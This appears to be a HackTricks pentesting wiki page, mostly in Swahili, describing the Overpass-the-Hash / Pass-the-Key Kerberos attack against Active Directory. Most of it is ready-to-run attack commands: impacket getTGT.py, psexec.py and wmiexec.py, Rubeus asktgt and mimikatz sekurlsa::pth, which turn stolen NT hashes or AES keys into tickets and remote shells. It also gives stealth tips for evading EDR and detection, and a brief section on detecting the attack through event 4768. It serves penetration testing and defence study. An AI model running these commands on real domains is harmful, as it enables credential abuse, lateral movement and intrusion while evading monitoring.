# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Shambulio la **Overpass The Hash/Pass The Key (PTK)** limeundwa kwa mazingira ambapo itifaki ya jadi ya NTLM imezuiwa, na uthibitishaji wa Kerberos unapewa kipaumbele. Shambulio hili hutumia NTLM hash au AES keys za mtumiaji ili kuomba Kerberos tickets, kuwezesha ufikiaji usioidhinishwa wa rasilimali ndani ya network.

Kwa ufupi kabisa:

- **Over-Pass-the-Hash** kawaida humaanisha kubadilisha **NT hash** kuwa Kerberos TGT kupitia **RC4-HMAC** Kerberos key.
- **Pass-the-Key** ni toleo la jumla zaidi ambapo tayari una Kerberos key kama **AES128/AES256** na unaomba TGT moja kwa moja nayo.

Tofauti hii ni muhimu katika mazingira yaliyofanywa hardening: ikiwa **RC4 imezimwa** au haitegemezwi tena na KDC, **NT hash pekee haitoshi** na unahitaji **AES key** (au cleartext password ili kuifanya derive).

Ili kutekeleza shambulio hili, hatua ya mwanzo inahusisha kupata NTLM hash au password ya account ya mtumiaji lengwa. Baada ya kupata taarifa hii, Ticket Granting Ticket (TGT) ya account inaweza kupatikana, ikimruhusu mshambuliaji kufikia services au machines ambazo mtumiaji ana permissions.

Mchakato unaweza kuanzishwa kwa kutumia commands zifuatazo:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Kwa hali zinazohitaji AES256, chaguo la `-aesKey [AES key]` linaweza kutumika:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` pia inasaidia kuomba **service ticket moja kwa moja kupitia AS-REQ** kwa `-service <SPN>`, ambayo inaweza kuwa na manufaa unapohitaji ticket kwa SPN fulani bila TGS-REQ ya ziada:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Zaidi ya hayo, tiketi iliyopatikana inaweza kutumiwa na zana mbalimbali, ikijumuisha `smbexec.py` au `wmiexec.py`, ikipanua wigo wa shambulio.

Matatizo yaliyokumbana nayo kama _PyAsn1Error_ au _KDC cannot find the name_ kwa kawaida hutatuliwa kwa kusasisha maktaba ya Impacket au kutumia hostname badala ya anwani ya IP, kuhakikisha utangamano na Kerberos KDC.

Mlolongo mbadala wa amri unaotumia Rubeus.exe unaonyesha upande mwingine wa mbinu hii:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Mbinu hii inaiga njia ya **Pass the Key**, ikiwa na lengo la kuteka na kutumia ticket moja kwa moja kwa madhumuni ya uthibitishaji. Kwa vitendo:

- `Rubeus asktgt` hutuma **raw Kerberos AS-REQ/AS-REP** yenyewe na haihitaji haki za admin isipokuwa ukitaka kulenga logon session nyingine kwa `/luid` au kuunda nyingine tofauti kwa `/createnetonly`.
- `mimikatz sekurlsa::pth` huweka patch kwenye credential material ndani ya logon session na kwa hiyo **huigusa LSASS**, jambo ambalo kwa kawaida linahitaji local admin au `SYSTEM` na huwa na kelele zaidi kutoka kwa mtazamo wa EDR.

Mifano kwa kutumia Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Ili kuzingatia operational security na kutumia AES256, amri ifuatayo inaweza kutumika:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` ni muhimu kwa sababu traffic ya Rubeus inatofautiana kidogo na native Windows Kerberos. Pia kumbuka kwamba `/opsec` imekusudiwa kwa traffic ya **AES256**; kuitumia na RC4 mara nyingi huhitaji `/force`, ambayo huondoa sehemu kubwa ya faida yake kwa sababu **RC4 katika modern domains yenyewe ni strong signal**.

## Detection notes

Kila ombi la TGT hutengeneza **event `4768`** kwenye DC. Katika current Windows builds, event hii ina fields muhimu zaidi kuliko zilivyoelezwa kwenye older writeups:

- `TicketEncryptionType` inakuambia ni enctype gani ilitumika kwa TGT iliyotolewa. Values za kawaida ni `0x17` kwa **RC4-HMAC**, `0x11` kwa **AES128**, na `0x12` kwa **AES256**.
- Updated events pia huonyesha `SessionKeyEncryptionType`, `PreAuthEncryptionType`, na client’s advertised enctypes, ambayo husaidia kutofautisha **real RC4 dependence** na confusing legacy defaults.
- Kuona `0x17` katika modern environment ni clue nzuri kwamba account, host, au KDC fallback path bado inaruhusu RC4 na hivyo ni more friendly kwa NT-hash-based Over-Pass-the-Hash.

Microsoft imekuwa ikipunguza RC4-by-default behavior hatua kwa hatua tangu November 2022 Kerberos hardening updates, na published guidance ya sasa ni **kuondoa RC4 kama default assumed enctype kwa AD DCs ifikapo mwisho wa Q2 2026**. Kwa mtazamo wa offensive, hiyo inamaanisha **Pass-the-Key with AES** inazidi kuwa njia ya kuaminika, wakati classic **NT-hash-only OpTH** itaendelea kushindwa mara nyingi zaidi kwenye hardened estates.

Kwa maelezo zaidi kuhusu Kerberos encryption types na related ticketing behaviour, angalia:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Kila logon session inaweza kuwa na TGT moja tu active kwa wakati mmoja, kwa hiyo kuwa makini.

1. Tengeneza logon session mpya kwa kutumia **`make_token`** kutoka Cobalt Strike.
2. Kisha, tumia Rubeus kutengeneza TGT kwa ajili ya new logon session bila kuathiri ile iliyopo.

Unaweza kupata similar isolation kutoka Rubeus yenyewe kwa sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Hii huepuka kuandika upya TGT ya seshoni ya sasa na kwa kawaida ni salama zaidi kuliko kuingiza tiketi ndani ya seshoni yako ya sasa ya logon.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
